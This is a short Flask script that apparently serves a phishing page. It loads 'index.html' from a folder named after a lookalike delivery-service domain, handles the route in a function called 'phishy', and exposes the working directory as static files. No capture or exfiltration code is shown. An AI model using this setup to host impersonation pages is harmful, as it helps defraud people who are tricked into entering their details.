from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='fastdelivery-lookup-note-mall.firebaseapp.com')

@app.route('/yytr.html')
def phishy():
    return render_template('index.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)